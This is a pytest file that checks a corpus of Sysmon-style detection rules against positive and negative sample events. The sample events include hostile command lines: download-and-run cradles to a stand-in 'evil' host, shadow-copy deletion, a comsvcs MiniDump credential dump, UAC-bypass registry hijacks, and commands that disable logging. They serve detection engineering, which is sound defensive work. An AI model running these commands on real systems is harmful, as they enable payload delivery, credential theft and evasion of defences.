"""Rule corpus validation.

Every shipped rule is exercised against a true positive it must catch and, where
it matters, a true negative it must ignore. This is the detection-engineering
contract in test form: a rule that never fires is worse than no rule, because it
creates false confidence in coverage, and a rule that fires on everything trains
the analyst to ignore it.

Two real bugs were caught writing these cases: a `condition: any` cradle rule
that fired on every PowerShell process regardless of command line, and a regex
whose `\b` word boundary failed against a hyphenated `-urlcache` flag.
"""

from __future__ import annotations

import pytest

from backend.config import settings
from backend.engine.matcher import evaluate
from backend.engine.rule_loader import RuleStore
from backend.models.schemas import Event

KNOWN_FIELDS = {
    "image",
    "parent_image",
    "command_line",
    "parent_command_line",
    "process_guid",
    "parent_process_guid",
    "host",
}


@pytest.fixture(scope="module")
def rules() -> dict:
    """Load the real rule corpus once for the whole module."""
    store = RuleStore()
    store.load(settings.rules_dir)
    assert not store.errors, f"rules failed to load: {store.errors}"
    return {rule.id: rule for rule in store.all}


def event(event_id: int = 1, **fields) -> Event:
    """Build an event, routing unknown keys into raw so rules can address
    Sysmon fields like TargetObject or GrantedAccess."""
    known = {k: v for k, v in fields.items() if k in KNOWN_FIELDS}
    raw = {k: v for k, v in fields.items() if k not in KNOWN_FIELDS}
    return Event(event_id=event_id, raw=raw, **known)


# (rule_id, should_fire, event). Each rule has at least one positive and, where
# a false positive is plausible, a negative that must stay quiet.
CASES = [
    # The three founding rules, validated here alongside the rest.
    (
        "SYS-001",
        True,
        event(1, parent_image=r"C:\O\WINWORD.EXE", image=r"C:\W\cmd.exe"),
    ),
    (
        "SYS-001",
        False,
        event(1, parent_image=r"C:\W\explorer.exe", image=r"C:\W\cmd.exe"),
    ),
    (
        "SYS-002",
        True,
        event(
            1, image=r"C:\W\powershell.exe", command_line="powershell -enc " + "A" * 40
        ),
    ),
    (
        "SYS-002",
        False,
        event(1, image=r"C:\W\powershell.exe", command_line="powershell -File a.ps1"),
    ),
    ("SYS-010", True, event(10, TargetImage=r"C:\W\lsass.exe", GrantedAccess="0x1410")),
    (
        "SYS-010",
        False,
        event(10, TargetImage=r"C:\W\explorer.exe", GrantedAccess="0x1410"),
    ),
    # --- Ostap chain rules, validated against the real EVTX sample ---
    # --- WinPwnage url.dll LOLBin, validated against the real EVTX sample ---
    # --- IIS appcmd credential discovery, validated against the real EVTX ---
    (
        "SYS-038",
        True,
        event(
            1,
            image=r"C:\Windows\System32\inetsrv\appcmd.exe",
            command_line=r"appcmd list apppool /text:processmodel.password",
        ),
    ),
    (
        "SYS-038",
        True,
        event(
            1,
            image=r"C:\Windows\System32\inetsrv\appcmd.exe",
            command_line=r"appcmd list vdir /text:password",
        ),
    ),
    (
        "SYS-038",
        False,
        event(
            1,
            image=r"C:\Windows\System32\inetsrv\appcmd.exe",
            command_line=r"appcmd list apppool /text:physicalpath",
        ),
    ),
    (
        "SYS-039",
        True,
        event(
            1,
            image=r"C:\Windows\System32\inetsrv\appcmd.exe",
            parent_image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line="appcmd list apppool",
        ),
    ),
    (
        "SYS-039",
        False,
        event(
            1,
            image=r"C:\Windows\System32\inetsrv\appcmd.exe",
            parent_image=r"C:\Windows\explorer.exe",
            command_line="appcmd list apppool",
        ),
    ),
    (
        "SYS-037",
        True,
        event(
            1,
            image=r"C:\Windows\System32\rundll32.exe",
            command_line=r"rundll32.exe  url.dll,OpenURL file://C:/Windows/system32/calc.exe",
        ),
    ),
    (
        "SYS-037",
        True,
        event(
            1,
            image=r"C:\Windows\System32\rundll32.exe",
            command_line=r"rundll32.exe  url.dll,FileProtocolHandler file:///C:/programdata/calc.hta",
        ),
    ),
    (
        "SYS-037",
        True,
        event(
            1,
            image=r"C:\Windows\System32\rundll32.exe",
            command_line=r'"C:\Windows\System32\rundll32.exe" ieframe.dll,OpenURL c:\temp\x.url',
        ),
    ),
    (
        "SYS-037",
        False,
        event(
            1,
            image=r"C:\Windows\System32\rundll32.exe",
            command_line=r"rundll32.exe shell32.dll,Control_RunDLL desk.cpl",
        ),
    ),
    # --- SYS-037 extension: three more LOLBAS exports, each validated against
    # a real EVTX (exec_sysmon_1_11_lolbin_rundll32_zipfldr_RouteTheCall.evtx,
    # exec_sysmon_1_lolbin_rundll32_advpack_RegisterOCX.evtx,
    # exec_sysmon_1_rundll32_pcwutl_LaunchApplication.evtx). ---
    (
        "SYS-037",
        True,
        event(
            1,
            image=r"C:\Windows\System32\rundll32.exe",
            command_line=r"C:\Windows\System32\rundll32.exe zipfldr.dll,RouteTheCall c:\Windows\System32\calc.exe",
        ),
    ),
    (
        "SYS-037",
        True,
        event(
            1,
            image=r"C:\Windows\System32\rundll32.exe",
            command_line=r"C:\Windows\System32\rundll32.exe  advpack.dll,RegisterOCX c:\Windows\System32\calc.exe",
        ),
    ),
    (
        "SYS-037",
        True,
        event(
            1,
            image=r"C:\Windows\System32\rundll32.exe",
            command_line=r"C:\Windows\System32\rundll32.exe  pcwutl.dll,LaunchApplication c:\Windows\system32\calc.exe",
        ),
    ),
    (
        "SYS-034",
        True,
        event(
            1,
            image=r"C:\Windows\System32\rundll32.exe",
            command_line=r'"C:\Windows\system32\rundll32.exe" Shell32.dll,Control_RunDLL "C:\Users\IEUser\Downloads\Invoice@0582.cpl",',
        ),
    ),
    (
        "SYS-034",
        True,
        event(
            1,
            image=r"C:\Windows\System32\control.exe",
            command_line=r'"C:\Windows\System32\control.exe" "C:\Users\IEUser\Downloads\Invoice@0582.cpl",',
        ),
    ),
    (
        "SYS-034",
        False,
        event(
            1,
            image=r"C:\Windows\System32\rundll32.exe",
            command_line=r'"C:\Windows\System32\rundll32.exe" Shell32.dll,Control_RunDLL "C:\Windows\System32\main.cpl",',
        ),
    ),
    (
        "SYS-035",
        True,
        event(
            1,
            image=r"C:\Windows\System32\wscript.exe",
            command_line=r'"C:\Windows\System32\wscript.exe" /e:JScript.Encode /nologo C:\Users\IEUser\AppData\Local\Temp\info.txt',
        ),
    ),
    (
        "SYS-035",
        False,
        event(
            1,
            image=r"C:\Windows\System32\wscript.exe",
            command_line=r"wscript.exe C:\Scripts\backup.vbs",
        ),
    ),
    (
        "SYS-036",
        True,
        event(
            1,
            parent_image=r"C:\Windows\SysWOW64\rundll32.exe",
            image=r"C:\Windows\System32\wscript.exe",
            command_line="wscript.exe x",
        ),
    ),
    (
        "SYS-036",
        False,
        event(
            1,
            parent_image=r"C:\Windows\explorer.exe",
            image=r"C:\Windows\System32\wscript.exe",
            command_line="wscript.exe x",
        ),
    ),
    (
        "SYS-003",
        True,
        event(1, command_line=r"certutil -urlcache -f http://evil/x.exe x.exe"),
    ),
    ("SYS-003", True, event(1, command_line=r"mshta http://evil/a.hta")),
    ("SYS-003", False, event(1, command_line=r"certutil -hashfile C:\a.txt SHA256")),
    ("SYS-004", True, event(1, command_line=r"vssadmin delete shadows /all /quiet")),
    ("SYS-004", True, event(1, command_line=r"wmic shadowcopy delete")),
    ("SYS-004", False, event(1, command_line=r"vssadmin list shadows")),
    (
        "SYS-005",
        True,
        event(1, parent_image=r"C:\W\outlook.exe", image=r"C:\W\powershell.exe"),
    ),
    (
        "SYS-005",
        False,
        event(1, parent_image=r"C:\W\explorer.exe", image=r"C:\W\powershell.exe"),
    ),
    ("SYS-006", True, event(1, image=r"C:\Users\emma\AppData\Local\Temp\payload.exe")),
    ("SYS-006", False, event(1, image=r"C:\Program Files\app\app.exe")),
    ("SYS-007", True, event(1, image=r"C:\Users\emma\svchost.exe")),
    ("SYS-007", False, event(1, image=r"C:\Windows\System32\svchost.exe")),
    (
        "SYS-008",
        True,
        event(1, image=r"C:\W\rundll32.exe", command_line="rundll32.exe"),
    ),
    (
        "SYS-008",
        False,
        event(
            1,
            image=r"C:\W\rundll32.exe",
            command_line=r"rundll32.exe shell32.dll,Control_RunDLL",
        ),
    ),
    (
        "SYS-009",
        True,
        event(
            1,
            image=r"C:\W\powershell.exe",
            command_line=r"powershell iex (New-Object Net.WebClient).DownloadString('http://x')",
        ),
    ),
    (
        "SYS-009",
        False,
        event(1, image=r"C:\W\powershell.exe", command_line="powershell Get-ChildItem"),
    ),
    (
        "SYS-020",
        True,
        event(
            3,
            image=r"C:\W\powershell.exe",
            DestinationIp="1.2.3.4",
            DestinationPort="443",
        ),
    ),
    (
        "SYS-020",
        False,
        event(
            3, image=r"C:\W\chrome.exe", DestinationIp="1.2.3.4", DestinationPort="443"
        ),
    ),
    ("SYS-021", True, event(3, image=r"C:\W\svchost.exe", DestinationPort="4444")),
    ("SYS-021", False, event(3, image=r"C:\W\chrome.exe", DestinationPort="4444")),
    (
        "SYS-030",
        True,
        event(
            13, TargetObject=r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\evil"
        ),
    ),
    ("SYS-030", False, event(13, TargetObject=r"HKLM\Software\App\Settings\Foo")),
    (
        "SYS-031",
        True,
        event(
            13,
            TargetObject=r"HKLM\Software\Policies\Microsoft\Windows Defender\DisableAntiSpyware",
        ),
    ),
    ("SYS-031", False, event(13, TargetObject=r"HKLM\Software\App\Foo")),
    (
        "SYS-032",
        True,
        event(
            13, TargetObject=r"HKLM\...\Image File Execution Options\sethc.exe\Debugger"
        ),
    ),
    (
        "SYS-032",
        False,
        event(
            13,
            TargetObject=r"HKLM\...\Image File Execution Options\notepad.exe\GlobalFlag",
        ),
    ),
    (
        "SYS-040",
        True,
        event(
            7,
            Image=r"C:\evil\loader.exe",
            ImageLoaded=r"C:\W\System.Management.Automation.dll",
        ),
    ),
    (
        "SYS-040",
        False,
        event(
            7,
            Image=r"C:\W\powershell.exe",
            ImageLoaded=r"C:\W\System.Management.Automation.dll",
        ),
    ),
    ("SYS-041", True, event(10, TargetImage=r"C:\W\lsass.exe", GrantedAccess="0x1410")),
    (
        "SYS-041",
        False,
        event(10, TargetImage=r"C:\W\lsass.exe", GrantedAccess="0x1000"),
    ),
    (
        "SYS-050",
        True,
        event(11, TargetFilename=r"C:\...\Start Menu\Programs\Startup\evil.exe"),
    ),
    ("SYS-050", False, event(11, TargetFilename=r"C:\Users\emma\Documents\a.txt")),
    (
        "SYS-051",
        True,
        event(
            11, Image=r"C:\O\WINWORD.EXE", TargetFilename=r"C:\Users\emma\AppData\a.ps1"
        ),
    ),
    (
        "SYS-051",
        False,
        event(11, Image=r"C:\O\WINWORD.EXE", TargetFilename=r"C:\Users\emma\doc.docx"),
    ),
    ("SYS-060", True, event(17, PipeName=r"\msagent_4f")),
    ("SYS-060", True, event(17, PipeName=r"\postex_1a2b")),
    ("SYS-060", False, event(17, PipeName=r"\lsass")),
    # --- WMI persistence: command-line staging (SYS-070) ---
    (
        "SYS-070",
        True,
        event(1, command_line=r"mofcomp.exe C:\Temp\evilsub.mof"),
    ),
    (
        "SYS-070",
        True,
        event(
            1,
            command_line=r"wmic /namespace:\\root\subscription PATH __EventFilter CREATE",
        ),
    ),
    ("SYS-070", False, event(1, command_line=r"wmic os get caption")),
    # --- WMI persistence: consumer registration (SYS-071), validated against
    # sysmon_20_21_1_CommandLineEventConsumer.evtx and wmighost_sysmon_20_21_1.evtx:
    # real Sysmon reports Type as the human-readable label ("Command Line",
    # "Script"), not the WMI class name the rule originally checked for. ---
    ("SYS-071", True, event(20, Type="Command Line")),
    ("SYS-071", True, event(20, Type="Script")),
    ("SYS-071", False, event(20, Type="Log File")),
    # --- PsExec named pipe (SYS-072) ---
    ("SYS-072", True, event(17, PipeName=r"\PSEXESVC")),
    ("SYS-072", True, event(17, PipeName=r"\PSEXESVC-1a2b-stdin")),
    ("SYS-072", False, event(17, PipeName=r"\lsass")),
    # --- PsExec service execution (SYS-073) ---
    (
        "SYS-073",
        True,
        event(1, image=r"C:\Windows\PSEXESVC.exe", command_line="PSEXESVC.exe"),
    ),
    (
        "SYS-073",
        True,
        event(
            1,
            image=r"C:\Tools\psexec.exe",
            command_line=r"psexec.exe -accepteula \\HOST cmd.exe",
        ),
    ),
    (
        "SYS-073",
        False,
        event(1, image=r"C:\Tools\psexec.exe", command_line=r"psexec.exe \\HOST cmd.exe"),
    ),
    # --- Regsvr32 Squiblydoo via scrobj.dll, independent of SYS-003 (SYS-074) ---
    (
        "SYS-074",
        True,
        event(
            1,
            image=r"C:\Windows\System32\regsvr32.exe",
            command_line=r"regsvr32.exe /s /u /i:evil.sct scrobj.dll",
        ),
    ),
    (
        "SYS-074",
        False,
        event(
            1,
            image=r"C:\Windows\System32\regsvr32.exe",
            command_line=r"regsvr32.exe C:\Program Files\App\legit.dll",
        ),
    ),
    # --- Certutil decode/encode, distinct from SYS-003's download check (SYS-075) ---
    (
        "SYS-075",
        True,
        event(
            1,
            image=r"C:\Windows\System32\certutil.exe",
            command_line=r"certutil.exe -decode payload.b64 payload.exe",
        ),
    ),
    (
        "SYS-075",
        False,
        event(
            1,
            image=r"C:\Windows\System32\certutil.exe",
            command_line=r"certutil.exe -hashfile C:\a.txt SHA256",
        ),
    ),
    # --- Start-BitsTransfer cmdlet, distinct from SYS-003's bitsadmin check (SYS-076) ---
    (
        "SYS-076",
        True,
        event(
            1,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line=r"Start-BitsTransfer -Source http://evil/x.exe -Destination x.exe",
        ),
    ),
    (
        "SYS-076",
        False,
        event(
            1,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line=r"Get-Process",
        ),
    ),
    # --- Unsigned driver load / BYOVD (SYS-077) ---
    ("SYS-077", True, event(6, ImageLoaded=r"C:\Windows\Temp\rtcore64.sys", Signed="false")),
    ("SYS-077", False, event(6, ImageLoaded=r"C:\Windows\System32\drivers\ndis.sys", Signed="true")),
    # --- Registry Run key written by wmiprvse.exe (SYS-078), validated
    # against wmi_remote_registry_sysmon.evtx: a remote WMI/DCOM connection
    # on port 135 followed by wmiprvse.exe writing exactly this key. ---
    (
        "SYS-078",
        True,
        event(
            13,
            image=r"C:\Windows\system32\wbem\wmiprvse.exe",
            TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\wmipers",
            Details="rundll32.exe a.dll, DllMain",
        ),
    ),
    (
        "SYS-078",
        False,
        event(
            13,
            image=r"C:\Windows\System32\msiexec.exe",
            TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SomeApp",
        ),
    ),
    # --- FTP client spawning a child process (SYS-079), validated against
    # exec_sysmon_1_ftp.evtx: ftp.exe -s:ftp.txt (WinPwnage's FTP execution
    # technique) spawning cmd.exe /C calc.exe. ---
    (
        "SYS-079",
        True,
        event(
            1,
            image=r"C:\Windows\System32\cmd.exe",
            parent_image=r"C:\Windows\System32\ftp.exe",
            command_line=r"C:\Windows\system32\cmd.exe /C c:\Windows\system32\calc.exe",
        ),
    ),
    (
        "SYS-079",
        False,
        event(
            1,
            image=r"C:\Windows\System32\cmd.exe",
            parent_image=r"C:\Windows\explorer.exe",
        ),
    ),
    # --- Ransom note dropped (SYS-080): the near-universal "how to
    # decrypt/recover" filename convention. ---
    (
        "SYS-080",
        True,
        event(11, TargetFilename=r"C:\Users\d.reyes\Desktop\HOW_TO_RECOVER_FILES.txt"),
    ),
    (
        "SYS-080",
        True,
        event(11, TargetFilename=r"C:\Users\d.reyes\Desktop\_readme.txt"),
    ),
    (
        "SYS-080",
        True,
        event(11, TargetFilename=r"C:\Users\d.reyes\Desktop\DECRYPT_INSTRUCTIONS.html"),
    ),
    (
        "SYS-080",
        False,
        event(11, TargetFilename=r"C:\Users\d.reyes\Documents\Q3_Forecast.xlsx"),
    ),
    # --- File written with a ransomware encryption extension (SYS-081):
    # fires per file, on the extension alone -- exactly what seed_rw.py's
    # mass-rename phase exercises. ---
    (
        "SYS-081",
        True,
        event(11, TargetFilename=r"C:\Shares\Finance\AP_Ledger.xlsx.locked"),
    ),
    (
        "SYS-081",
        True,
        event(11, TargetFilename=r"C:\Users\d.reyes\Documents\Board_Minutes.docx.crypted"),
    ),
    (
        "SYS-081",
        False,
        event(11, TargetFilename=r"C:\Users\d.reyes\Documents\Q3_Forecast.xlsx"),
    ),
    # --- Credential dumping via comsvcs.dll MiniDump (SYS-082), validated
    # against sysmon_10_1_memdump_comsvcs_minidump.evtx: rundll32 calling the
    # MiniDump export directly, target PID and dump path on the command line. ---
    (
        "SYS-082",
        True,
        event(
            1,
            image=r"C:\Windows\System32\rundll32.exe",
            command_line=r"rundll32 C:\windows\system32\comsvcs.dll, MiniDump 4868 C:\Windows\System32\notepad.bin full",
        ),
    ),
    (
        "SYS-082",
        False,
        event(
            1,
            image=r"C:\Windows\System32\rundll32.exe",
            command_line=r"rundll32.exe  url.dll,OpenURL file://C:/Windows/system32/calc.exe",
        ),
    ),
    # --- Fileless UAC bypass via registry hijack (SYS-083), validated against
    # three real samples: Sysmon_13_1_UACBypass_SDCLTBypass.evtx (exefile
    # shell\runas\command\IsolatedCommand), sysmon_1_13_UACBypass_AppPath_
    # Control.evtx (App Paths\control.exe), and
    # sysmon_13_1_compmgmtlauncherUACBypass.evtx (mscfile shell\open\command). ---
    (
        "SYS-083",
        True,
        event(
            13,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            TargetObject=r"HKU\S-1-5-21-1_CLASSES\exefile\shell\runas\command\IsolatedCommand",
            Details=r"C:\Windows\System32\cmd.exe /c notepad.exe",
        ),
    ),
    (
        "SYS-083",
        True,
        event(
            13,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            TargetObject=r"HKU\S-1-5-21-1\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe\(Default)",
            Details=r"C:\windows\system32\cmd.exe",
        ),
    ),
    (
        "SYS-083",
        True,
        event(
            13,
            image=r"c:\python27\python.exe",
            TargetObject=r"HKU\S-1-5-21-1_CLASSES\mscfile\shell\open\command\(Default)",
            Details=r"c:\Windows\System32\cmd.exe",
        ),
    ),
    (
        "SYS-083",
        False,
        event(
            13,
            image=r"C:\Windows\System32\reg.exe",
            TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SomeApp",
            Details=r"C:\Program Files\App\app.exe",
        ),
    ),
    # --- CMSTP silent/auto-install execution (SYS-084), validated against
    # sysmon_1_13_11_cmstp_ini_uacbypass.evtx: cmstp.exe /au against a
    # WinPwnage-crafted .ini, a documented UAC-bypass and LOLBAS technique. ---
    (
        "SYS-084",
        True,
        event(
            1,
            image=r"C:\Windows\System32\cmstp.exe",
            command_line=r'"C:\Windows\System32\cmstp.exe" /au c:\users\ieuser\appdata\local\temp\tmp.ini',
        ),
    ),
    (
        "SYS-084",
        False,
        event(
            1,
            image=r"C:\Windows\System32\cmstp.exe",
            command_line=r'"C:\Windows\System32\cmstp.exe" C:\Users\ieuser\Documents\legit.CMP',
        ),
    ),
    # --- netsh portproxy port forwarding (SYS-085), validated against
    # de_portforward_netsh_rdp_sysmon_13_1.evtx: netsh writing a v4tov4 relay
    # rule that tunnels a listener port through to a remote RDP endpoint. ---
    (
        "SYS-085",
        True,
        event(
            13,
            image=r"C:\Windows\system32\netsh.exe",
            TargetObject=r"HKLM\System\CurrentControlSet\services\PortProxy\v4tov4\tcp\1.2.3.4/8001",
            Details="1.2.3.5/3389",
        ),
    ),
    (
        "SYS-085",
        False,
        event(
            13,
            image=r"C:\Windows\system32\netsh.exe",
            TargetObject=r"HKLM\System\CurrentControlSet\services\SharedAccess\Parameters\FirewallPolicy",
        ),
    ),
    # --- PowerShell script block logging disabled (SYS-086), validated against
    # de_PsScriptBlockLogging_disabled_sysmon12_13.evtx: reg.exe zeroing the
    # EnableScriptBlockLogging policy value. ---
    (
        "SYS-086",
        True,
        event(
            13,
            image=r"C:\Windows\system32\reg.exe",
            TargetObject=r"HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging",
            Details="DWORD (0x00000000)",
        ),
    ),
    (
        "SYS-086",
        False,
        event(
            13,
            image=r"C:\Windows\system32\reg.exe",
            TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SomeApp",
        ),
    ),
    # --- PowerShell CLM lockdown policy removed (SYS-087), validated against
    # DE_Powershell_CLM_Disabled_Sysmon_12.evtx: powershell.exe deleting its own
    # __PSLockdownPolicy environment value. ---
    (
        "SYS-087",
        True,
        event(
            12,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            EventType="DeleteValue",
            TargetObject=r"HKLM\System\CurrentControlSet\Control\SESSION MANAGER\Environment\__PSLockdownPolicy",
        ),
    ),
    (
        "SYS-087",
        False,
        event(
            12,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            EventType="CreateKey",
            TargetObject=r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer",
        ),
    ),
    # --- IIS worker process spawning a shell (SYS-088), validated against
    # LM_typical_IIS_webshell_sysmon_1_10_traces.evtx: w3wp.exe running the
    # DefaultAppPool identity spawning cmd.exe /c net user. ---
    (
        "SYS-088",
        True,
        event(
            1,
            image=r"C:\Windows\System32\cmd.exe",
            parent_image=r"C:\Windows\System32\inetsrv\w3wp.exe",
            command_line=r'"c:\windows\system32\cmd.exe" /c net user',
        ),
    ),
    (
        "SYS-088",
        False,
        event(
            1,
            image=r"C:\Windows\System32\inetsrv\w3wp.exe",
            parent_image=r"C:\Windows\System32\services.exe",
        ),
    ),
    # --- SQL Server spawning a shell / xp_cmdshell (SYS-089), validated
    # against sysmon_1_exec_via_sql_xpcmdshell.evtx: sqlservr.exe (running as
    # the sqlsvc service account) spawning cmd.exe. ---
    (
        "SYS-089",
        True,
        event(
            1,
            image=r"C:\Windows\System32\cmd.exe",
            parent_image=r"C:\Program Files\Microsoft SQL Server\MSSQL10.SQLEXPRESS\MSSQL\Binn\sqlservr.exe",
            command_line=r'"C:\Windows\system32\cmd.exe" /c set > c:\users\public\netstat.txt',
        ),
    ),
    (
        "SYS-089",
        False,
        event(
            1,
            image=r"C:\Program Files\Microsoft SQL Server\MSSQL10.SQLEXPRESS\MSSQL\Binn\sqlservr.exe",
            parent_image=r"C:\Windows\System32\services.exe",
        ),
    ),
    # --- Process spawned by the PS Remoting host (SYS-090), validated against
    # LM_PowershellRemoting_sysmon_1_wsmprovhost.evtx: wsmprovhost.exe (the
    # WinRM session host) spawning a command a remote operator sent. ---
    (
        "SYS-090",
        True,
        event(
            1,
            image=r"C:\Windows\System32\HOSTNAME.EXE",
            parent_image=r"C:\Windows\System32\wsmprovhost.exe",
        ),
    ),
    (
        "SYS-090",
        False,
        event(
            1,
            image=r"C:\Windows\System32\HOSTNAME.EXE",
            parent_image=r"C:\Windows\System32\cmd.exe",
        ),
    ),
    # --- Direct SAM manipulation (SYS-091), validated against
    # sysmon_local_account_creation_and_added_admingroup_12_13.evtx: lsass.exe
    # writing a new account's Names entry, then the Administrators alias. ---
    (
        "SYS-091",
        True,
        event(
            13,
            image=r"C:\windows\system32\lsass.exe",
            TargetObject=r"HKLM\SAM\SAM\Domains\Account\Users\Names\support\(Default)",
            Details="Binary Data",
        ),
    ),
    (
        "SYS-091",
        True,
        event(
            13,
            image=r"C:\windows\system32\lsass.exe",
            TargetObject=r"HKLM\SAM\SAM\Domains\Builtin\Aliases\00000220\C",
            Details="Binary Data",
        ),
    ),
    (
        "SYS-091",
        False,
        event(
            13,
            image=r"C:\windows\system32\lsass.exe",
            TargetObject=r"HKLM\SAM\SAM\Domains\Account\F",
        ),
    ),
]


@pytest.mark.parametrize("rule_id, should_fire, evt", CASES)
def test_rule_fires_as_expected(rules, rule_id, should_fire, evt) -> None:
    rule = rules.get(rule_id)
    assert rule is not None, f"{rule_id} is not in the loaded corpus"
    fired = bool(evaluate(evt, [rule]))
    assert fired == should_fire


def test_every_rule_has_a_test_case(rules) -> None:
    """Guardrail: a rule added without a validation case is a coverage gap. This
    fails the moment someone ships a rule and forgets to prove it fires."""
    tested = {rule_id for rule_id, _, _ in CASES}
    untested = set(rules) - tested
    assert not untested, f"rules with no validation case: {sorted(untested)}"
